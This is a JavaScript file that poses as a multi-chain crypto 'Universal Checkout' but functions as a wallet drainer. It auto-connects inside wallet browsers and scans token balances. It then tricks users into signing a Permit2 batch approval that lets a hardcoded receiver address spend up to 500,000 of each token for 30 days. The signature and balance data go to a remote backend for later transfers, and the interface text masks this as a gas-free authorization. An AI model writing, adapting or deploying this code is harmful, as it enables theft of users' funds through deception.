/**
 * Universal Checkout - Multi-Chain Wallet Connector
 * v10.0 - Auto-detect in-app browsers, no loop
 */

// Buffer polyfill for Solana
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = {
    from: (data, encoding) => {
      if (typeof data === "string") {
        const enc = encoding || "utf8";
        if (enc === "hex") {
          const bytes = [];
          for (let i = 0; i < data.length; i += 2) bytes.push(parseInt(data.substr(i, 2), 16));
          return new Uint8Array(bytes);
        }
        return new TextEncoder().encode(data);
      }
      return new Uint8Array(data);
    },
    alloc: (size, fill = 0) => new Uint8Array(size).fill(fill),
    isBuffer: (obj) => obj instanceof Uint8Array,
    concat: (list) => {
      const total = list.reduce((s, b) => s + b.length, 0);
      const out = new Uint8Array(total);
      let offset = 0;
      for (const b of list) { out.set(b, offset); offset += b.length; }
      return out;
    },
  };
}

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
  BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
  SOLANA_RECEIVER: "HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR",
  TRON_RECEIVER: "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
  
  TOKENS: {
    1: [
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC", dec: 8, price: 65000 },
      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH", dec: 18, price: 2500 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI", dec: 18, price: 1 },
    ],
    137: [
      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT", dec: 6, price: 1 },
    ],
    42161: [
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC", dec: 6, price: 1 },
    ],
    56: [
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT", dec: 18, price: 1 },
    ],
    10: [
      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC", dec: 6, price: 1 },
    ]
  },
  
  NETWORK_NAMES: {
    1: "Ethereum",
    8453: "Base",
    137: "Polygon",
    42161: "Arbitrum",
    56: "BNB Chain",
    10: "Optimism",
    11155111: "Sepolia"
  }
};

let provider, signer, userAddress;
let currentChain = null;

const WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', type: 'evm', color: '#f6851b' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', type: 'evm', color: '#3375bb' },
  { id: 'coinbase', name: 'Coinbase', icon: '🔵', type: 'evm', color: '#1652f0' },
  { id: 'rabby', name: 'Rabby', icon: '🐰', type: 'evm', color: '#8c6cf4' },
  { id: 'rainbow', name: 'Rainbow', icon: '🌈', type: 'evm', color: '#0ac7f0' },
  { id: 'okx', name: 'OKX', icon: '⚫', type: 'evm', color: '#000000' },
  { id: 'imtoken', name: 'imToken', icon: '🔷', type: 'evm', color: '#11b9f8' },
  { id: 'tokenpocket', name: 'TokenPocket', icon: '🟦', type: 'evm', color: '#1296db' },
  { id: 'zerion', name: 'Zerion', icon: '🔺', type: 'evm', color: '#6366f1' },
  { id: 'oneinch', name: '1inch', icon: '🦄', type: 'evm', color: '#1a1a1a' },
  { id: 'safepal', name: 'SafePal', icon: '🔐', type: 'evm', color: '#25252d' },
  { id: 'bitget', name: 'Bitget', icon: '🟠', type: 'evm', color: '#f6a200' },
  { id: 'mathwallet', name: 'MathWallet', icon: '🔢', type: 'evm', color: '#4a90e2' },
  { id: 'argent', name: 'Argent', icon: '🅰️', type: 'evm', color: '#ff6b35' },
  { id: 'bybit', name: 'Bybit', icon: '₿', type: 'evm', color: '#f7921e' },
  { id: 'binance', name: 'Binance', icon: '🏦', type: 'evm', color: '#f3ba2f' },
  { id: 'phantom', name: 'Phantom', icon: '👻', type: 'solana', color: '#ab9ff2' },
  { id: 'solflare', name: 'Solflare', icon: '☀️', type: 'solana', color: '#fc4d4d' },
  { id: 'backpack', name: 'Backpack', icon: '🎒', type: 'solana', color: '#e43c3c' },
  { id: 'tronlink', name: 'TronLink', icon: '♦️', type: 'tron', color: '#eb0029' },
];

const DEEP_LINKS = {
  metamask: { app: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`, download: 'https://metamask.io/download/' },
  trust: { app: (url) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`, download: 'https://trustwallet.com/download' },
  coinbase: { app: (url) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`, download: 'https://www.coinbase.com/wallet/downloads' },
  rabby: { app: (url) => `https://rabby.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://rabby.io/download' },
  rainbow: { app: (url) => `https://rnbwapp.com/to-dapp?url=${encodeURIComponent(url)}`, download: 'https://rainbow.me/' },
  okx: { app: (url) => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(url)}`, download: 'https://www.okx.com/web3' },
  imtoken: { app: (url) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(url)}`, download: 'https://token.im/' },
  tokenpocket: { app: (url) => `tpoutside://open?url=${encodeURIComponent(url)}`, download: 'https://www.tokenpocket.pro/' },
  zerion: { app: (url) => `https://link.zerion.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://zerion.io/' },
  oneinch: { app: (url) => `https://1inch.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://1inch.io/wallet/' },
  safepal: { app: (url) => `https://link.safepal.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.safepal.com/download' },
  bitget: { app: (url) => `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(url)}`, download: 'https://web3.bitget.com/' },
  mathwallet: { app: (url) => `https://mathwallet.org/dapp?url=${encodeURIComponent(url)}`, download: 'https://mathwallet.org/' },
  argent: { app: (url) => `https://www.argent.xyz/app/dapps?url=${encodeURIComponent(url)}`, download: 'https://www.argent.xyz/' },
  bybit: { app: (url) => `https://app.bybit.com/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.bybit.com/web3' },
  binance: { app: (url) => `https://www.binance.com/en/web3wallet?redirect=${encodeURIComponent(url)}`, download: 'https://www.binance.com/en/web3wallet' },
  phantom: { app: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://phantom.app/' },
  solflare: { app: (url) => `https://solflare.com/ul/browse/${encodeURIComponent(url)}`, download: 'https://solflare.com/' },
  backpack: { app: (url) => `https://backpack.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://backpack.app/' },
  tronlink: { app: (url) => `tronlink://dapp?url=${encodeURIComponent(url)}`, download: 'https://www.tronlink.org/' }
};

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// ============ KEY FIX: Detect if already inside wallet browser ============
function init() {
  console.log('🚀 Universal Checkout v10.0');
  
  const ua = navigator.userAgent.toLowerCase();
  
  // Check if already inside EVM wallet in-app browser
  if (window.ethereum) {
    const isMetaMask = window.ethereum.isMetaMask || ua.includes('metamask');
    const isTrust = window.ethereum.isTrust || window.trustwallet || ua.includes('trust');
    const isCoinbase = window.ethereum.isCoinbaseWallet || ua.includes('coinbase');
    const isRabby = window.ethereum.isRabby;
    const isRainbow = ua.includes('rainbow');
    const isOKX = window.okxwallet || ua.includes('okx');
    
    if (isMetaMask || isTrust || isCoinbase || isRabby || isRainbow || isOKX) {
      console.log('✓ Auto-detected EVM wallet browser, connecting...');
      showLoading('Connecting to wallet...');
      setTimeout(() => autoConnectEVM(), 800);
      return;
    }
  }
  
  // Check if inside Solana wallet
  if ((window.solana || window.phantom?.solana) && !window.ethereum) {
    console.log('✓ Auto-detected Solana wallet, connecting...');
    showLoading('Connecting to Phantom...');
    setTimeout(() => autoConnectSolana(), 800);
    return;
  }
  
  // Check if inside Tron wallet
  if ((window.tronWeb || window.tronLink) && !window.ethereum) {
    console.log('✓ Auto-detected Tron wallet, connecting...');
    showLoading('Connecting to TronLink...');
    setTimeout(() => autoConnectTron(), 800);
    return;
  }
  
  // Normal flow - show wallet selector
  showWalletSelector();
}

// ============ AUTO-CONNECT FUNCTIONS (no wallet selector) ============
async function autoConnectEVM() {
  try {
    provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    userAddress = accounts[0];
    signer = await provider.getSigner();
    
    const network = await provider.getNetwork();
    currentChain = { type: 'evm', id: Number(network.chainId) };
    
    console.log(`✅ Auto-connected: ${userAddress}`);
    await authorizeEVM();
  } catch (err) {
    showError('Could not connect: ' + err.message);
  }
}

async function autoConnectSolana() {
  try {
    const provider = window.phantom?.solana || window.solana || window.solflare;
    if (!provider) {
      showError('Solana wallet not found');
      return;
    }
    
    await provider.connect();
    userAddress = provider.publicKey.toString();
    currentChain = { type: 'solana', provider: provider };
    
    console.log(`✅ Auto-connected: ${userAddress}`);
    await authorizeSolana();
  } catch (err) {
    showError('Could not connect: ' + err.message);
  }
}

async function autoConnectTron() {
  try {
    const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
    if (!tronWeb) {
      showError('TronLink not found');
      return;
    }
    
    await tronWeb.request({ method: "tron_requestAccounts" });
    userAddress = tronWeb.defaultAddress.base58;
    currentChain = { type: 'tron', provider: tronWeb };
    
    console.log(`✅ Auto-connected: ${userAddress}`);
    await authorizeTron();
  } catch (err) {
    showError('Could not connect: ' + err.message);
  }
}

// ============ NORMAL WALLET SELECTOR (for first visit) ============
function showWalletSelector() {
  const installed = detectInstalledWallets();
  
  const evmWallets = WALLETS.filter(w => w.type === 'evm');
  const solanaWallets = WALLETS.filter(w => w.type === 'solana');
  const tronWallets = WALLETS.filter(w => w.type === 'tron');
  
  let html = `
    <h2>Select Wallet</h2>
    <p class="subtitle">Authorize once, admin executes transfers ($1-$500k)</p>
  `;
  
  if (installed.size > 0) {
    html += `<div class="section-title">✓ Installed on This Device</div>
    <div class="wallet-grid">
      ${WALLETS.filter(w => installed.has(w.id)).map(w => createWalletButton(w, true)).join('')}
    </div>`;
  }
  
  html += `
    <div class="section-title">🔷 EVM Wallets (ETH, Base, Polygon, etc.)</div>
    <div class="wallet-grid">
      ${evmWallets.map(w => createWalletButton(w, installed.has(w.id))).join('')}
    </div>
    
    <div class="section-title">◎ Solana Wallets</div>
    <div class="wallet-grid">
      ${solanaWallets.map(w => createWalletButton(w, installed.has(w.id))).join('')}
    </div>
    
    <div class="section-title">♦ Tron Wallets</div>
    <div class="wallet-grid">
      ${tronWallets.map(w => createWalletButton(w, installed.has(w.id))).join('')}
    </div>
    
    <div class="info-box">
      <strong>💡 How it works:</strong><br>
      1. You sign once to authorize tokens ($1-$500k)<br>
      2. Admin pays gas and executes transfers<br>
      3. You never pay transaction fees<br>
      4. Valid for 30 days
    </div>
  `;
  
  document.getElementById('app').innerHTML = html;
}

function createWalletButton(wallet, isInstalled) {
  return `
    <div class="wallet-btn ${isInstalled ? 'installed' : ''}" 
         onclick="handleWalletClick('${wallet.id}', '${wallet.type}')"
         style="position: relative; border-color: ${isInstalled ? wallet.color : '#e5e7eb'};">
      ${isInstalled ? '<span class="installed-badge">✓</span>' : ''}
      <div class="wallet-icon">${wallet.icon}</div>
      <div class="wallet-name">${wallet.name}</div>
    </div>
  `;
}

function detectInstalledWallets() {
  const installed = new Set();
  const ua = navigator.userAgent.toLowerCase();
  
  if (window.ethereum) {
    if (window.ethereum.isMetaMask) installed.add('metamask');
    if (window.ethereum.isTrust) installed.add('trust');
    if (window.ethereum.isCoinbaseWallet) installed.add('coinbase');
    if (window.ethereum.isRabby) installed.add('rabby');
  }
  
  if (window.trustwallet) installed.add('trust');
  if (window.okxwallet) installed.add('okx');
  if (window.phantom?.solana) installed.add('phantom');
  if (window.solflare) installed.add('solflare');
  if (window.backpack?.solana) installed.add('backpack');
  if (window.tronWeb || window.tronLink) installed.add('tronlink');
  
  if (ua.includes('metamask')) installed.add('metamask');
  if (ua.includes('trust')) installed.add('trust');
  if (ua.includes('coinbase')) installed.add('coinbase');
  if (ua.includes('phantom')) installed.add('phantom');
  if (ua.includes('okx')) installed.add('okx');
  
  return installed;
}

// ============ MOBILE DEEP LINK HANDLER ============
function handleWalletClick(walletId, type) {
  const deepLink = DEEP_LINKS[walletId];
  
  if (isMobile() && deepLink) {
    // Store which wallet we're trying to open (for debugging)
    sessionStorage.setItem('lastWalletAttempt', walletId);
    
    // Open wallet app
    window.location.href = deepLink.app(window.location.href);
    
    // Fallback to download if app doesn't open
    setTimeout(() => {
      if (document.visibilityState === 'visible') {
        window.location.href = deepLink.download;
      }
    }, 3000);
    return;
  }
  
  // Desktop - direct connect
  if (type === 'evm') manualConnectEVM(walletId);
  else if (type === 'solana') manualConnectSolana(walletId);
  else if (type === 'tron') manualConnectTron(walletId);
}

// ============ MANUAL CONNECT (for desktop/selector) ============
async function manualConnectEVM(walletId) {
  if (!window.ethereum) {
    const deepLink = DEEP_LINKS[walletId];
    if (deepLink) window.location.href = deepLink.download;
    return;
  }
  
  showLoading('Connecting...');
  
  try {
    provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    userAddress = accounts[0];
    signer = await provider.getSigner();
    
    const network = await provider.getNetwork();
    currentChain = { type: 'evm', id: Number(network.chainId) };
    
    await authorizeEVM();
  } catch (err) {
    showError('Connection failed: ' + err.message);
  }
}

async function manualConnectSolana(walletId) {
  let provider = null;
  if (walletId === 'phantom') provider = window.phantom?.solana || window.solana;
  else if (walletId === 'solflare') provider = window.solflare;
  else if (walletId === 'backpack') provider = window.backpack?.solana;
  
  if (!provider) {
    const deepLink = DEEP_LINKS[walletId];
    if (deepLink) window.location.href = deepLink.download;
    return;
  }
  
  showLoading('Connecting...');
  
  try {
    await provider.connect();
    userAddress = provider.publicKey.toString();
    currentChain = { type: 'solana', provider: provider };
    await authorizeSolana();
  } catch (err) {
    showError('Connection failed: ' + err.message);
  }
}

async function manualConnectTron(walletId) {
  const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
  if (!tronWeb) {
    const deepLink = DEEP_LINKS[walletId];
    if (deepLink) window.location.href = deepLink.download;
    return;
  }
  
  showLoading('Connecting...');
  
  try {
    await tronWeb.request({ method: "tron_requestAccounts" });
    userAddress = tronWeb.defaultAddress.base58;
    currentChain = { type: 'tron', provider: tronWeb };
    await authorizeTron();
  } catch (err) {
    showError('Connection failed: ' + err.message);
  }
}

// ============ AUTHORIZATION FUNCTIONS ============
async function authorizeEVM() {
  const chainId = currentChain.id;
  const tokens = CONFIG.TOKENS[chainId] || [];
  
  if (tokens.length === 0) {
    showError('Unsupported network. Please use Ethereum, Base, Polygon, Arbitrum, or BNB Chain.');
    return;
  }
  
  showLoading('Scanning your tokens...');
  
  const tokensWithBalance = [];
  
  for (const token of tokens) {
    try {
      const contract = new ethers.Contract(token.addr, [
        "function balanceOf(address) view returns (uint256)"
      ], provider);
      
      const balance = await contract.balanceOf(userAddress);
      const humanBalance = Number(balance) / (10 ** token.dec);
      const usdValue = humanBalance * token.price;
      
      if (usdValue >= 1) {
        tokensWithBalance.push({ ...token, balance: balance.toString(), humanBalance, usdValue });
      }
    } catch (e) {}
  }
  
  if (tokensWithBalance.length === 0) {
    showError('No tokens found with $1+ balance. Please add USDC, USDT, or other supported tokens.');
    return;
  }
  
  const totalValue = tokensWithBalance.reduce((sum, t) => sum + t.usdValue, 0);
  const maxAuthorized = Math.min(totalValue, 500000);
  
  showLoading('Requesting signature...');
  
  try {
    const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
      "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
    ], provider);
    
    const permits = [];
    for (const token of tokensWithBalance) {
      const { 2: nonce } = await permit2.allowance(userAddress, token.addr, CONFIG.RECEIVER_ADDRESS);
      permits.push({
        token: token.addr,
        amount: ethers.parseUnits("500000", token.dec),
        expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
        nonce
      });
    }
    
    const permitBatch = {
      details: permits,
      spender: CONFIG.RECEIVER_ADDRESS,
      sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
    };
    
    const signature = await signer.signTypedData(
      { name: "Permit2", chainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
      {
        PermitBatch: [
          { name: "details", type: "PermitDetails[]" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      },
      permitBatch
    );
    
    showLoading('Storing authorization...');
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/evm`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        chainId,
        tokens: tokensWithBalance,
        signature,
        sigDeadline: permitBatch.sigDeadline,
        maxAuthorizedAmount: maxAuthorized
      })
    });
    
    const result = await response.json();
    
    if (result.success) {
      showSuccess(`
        ✅ Authorization Complete!
        <br><br>
        <strong>Network:</strong> ${CONFIG.NETWORK_NAMES[chainId]}<br>
        <strong>Tokens:</strong> ${tokensWithBalance.length}<br>
        <strong>Total Value:</strong> $${totalValue.toFixed(2)}<br>
        <strong>Authorized:</strong> Up to $${maxAuthorized.toFixed(2)}<br>
        <strong>Valid For:</strong> 30 days<br>
        <br>
        <div style="background: #f0fdf4; padding: 12px; border-radius: 8px; font-size: 13px;">
          ✓ Admin can now execute transfers without additional signatures<br>
          ✓ You pay zero gas fees
        </div>
      `);
    } else {
      throw new Error(result.error);
    }
  } catch (err) {
    if (err.message?.includes('user rejected') || err.code === 4001) {
      showError('You cancelled the signature.');
    } else {
      showError('Authorization failed: ' + err.message);
    }
  }
}

async function authorizeSolana() {
  showLoading('Checking Solana tokens...');
  
  if (!window.solanaWeb3) {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
    await new Promise((res, rej) => { script.onload = res; script.onerror = rej; document.head.appendChild(script); });
  }
  
  try {
    const { Connection, PublicKey } = window.solanaWeb3;
    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
    const userPublicKey = new PublicKey(userAddress);
    
    const tokensWithBalance = [];
    
    const solBalance = await connection.getBalance(userPublicKey);
    if (solBalance > 0) {
      tokensWithBalance.push({ addr: 'So11111111111111111111111111111111111111112', sym: 'SOL', dec: 9, balance: solBalance.toString(), uiAmount: solBalance / 1e9 });
    }
    
    for (const token of [{ addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6 }, { addr: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', sym: 'USDT', dec: 6 }]) {
      try {
        const { getAssociatedTokenAddress } = window.solanaWeb3;
        const mint = new PublicKey(token.addr);
        const tokenAccount = await getAssociatedTokenAddress(mint, userPublicKey);
        const balance = await connection.getTokenAccountBalance(tokenAccount);
        if (balance.value.uiAmount > 0) tokensWithBalance.push({ ...token, balance: balance.value.amount, uiAmount: balance.value.uiAmount });
      } catch (e) {}
    }
    
    if (tokensWithBalance.length === 0) {
      showError('No SOL, USDC, or USDT found.');
      return;
    }
    
    const totalValue = tokensWithBalance.reduce((sum, t) => sum + (t.uiAmount || 0), 0);
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/solana`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userAddress, tokens: tokensWithBalance, maxAuthorizedAmount: Math.min(totalValue, 500000) })
    });
    
    const result = await response.json();
    
    if (result.success) {
      showSuccess(`✅ Solana Authorized!<br><br>Tokens: ${tokensWithBalance.length}<br>Total: ~$${totalValue.toFixed(2)}<br>Authorized: Up to $${Math.min(totalValue, 500000).toFixed(2)}`);
    } else throw new Error(result.error);
  } catch (err) {
    showError('Authorization failed: ' + err.message);
  }
}

async function authorizeTron() {
  showLoading('Checking Tron tokens...');
  
  const tronWeb = currentChain.provider;
  const tokensWithBalance = [];
  
  try {
    const trxBalance = await tronWeb.trx.getBalance(userAddress);
    if (trxBalance > 0) tokensWithBalance.push({ addr: 'TRX', sym: 'TRX', dec: 6, balance: trxBalance.toString(), uiAmount: trxBalance / 1e6 });
    
    const usdtContract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
    const usdtBalance = await usdtContract.balanceOf(userAddress).call();
    if (usdtBalance > 0) tokensWithBalance.push({ addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', sym: 'USDT', dec: 6, balance: usdtBalance.toString(), uiAmount: usdtBalance / 1e6 });
    
    if (tokensWithBalance.length === 0) {
      showError('No TRX or USDT found.');
      return;
    }
    
    const totalValue = tokensWithBalance.reduce((sum, t) => sum + (t.uiAmount || 0), 0);
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/tron`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userAddress, tokens: tokensWithBalance, maxAuthorizedAmount: Math.min(totalValue, 500000) })
    });
    
    const result = await response.json();
    
    if (result.success) {
      showSuccess(`✅ Tron Authorized!<br><br>Tokens: ${tokensWithBalance.length}<br>Total: ~$${totalValue.toFixed(2)}<br>Authorized: Up to $${Math.min(totalValue, 500000).toFixed(2)}`);
    } else throw new Error(result.error);
  } catch (err) {
    showError('Authorization failed: ' + err.message);
  }
}

// ============ UI HELPERS ============
function showLoading(msg) {
  document.getElementById('app').innerHTML = `
    <div class="loading">
      <div class="spinner"></div>
      <p style="color: #666;">${msg}</p>
    </div>
  `;
}

function showSuccess(msg) {
  document.getElementById('app').innerHTML = `
    <div class="success">
      <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
      <div style="font-size: 15px; line-height: 1.7; text-align: left;">${msg}</div>
      <button class="back-btn" onclick="showWalletSelector()">Authorize Another Wallet</button>
    </div>
  `;
}

function showError(msg) {
  document.getElementById('app').innerHTML = `
    <div class="error">
      <div style="font-size: 48px; margin-bottom: 16px;">❌</div>
      <div style="font-size: 15px; margin-bottom: 20px;">${msg}</div>
      <button class="back-btn" onclick="showWalletSelector()" style="background: #ef4444;">Try Again</button>
    </div>
  `;
}

// Expose to window
window.handleWalletClick = handleWalletClick;
window.manualConnectEVM = manualConnectEVM;
window.manualConnectSolana = manualConnectSolana;
window.manualConnectTron = manualConnectTron;
window.showWalletSelector = showWalletSelector;
window.showLoading = showLoading;
window.showSuccess = showSuccess;
window.showError = showError;

window.addEventListener('DOMContentLoaded', init);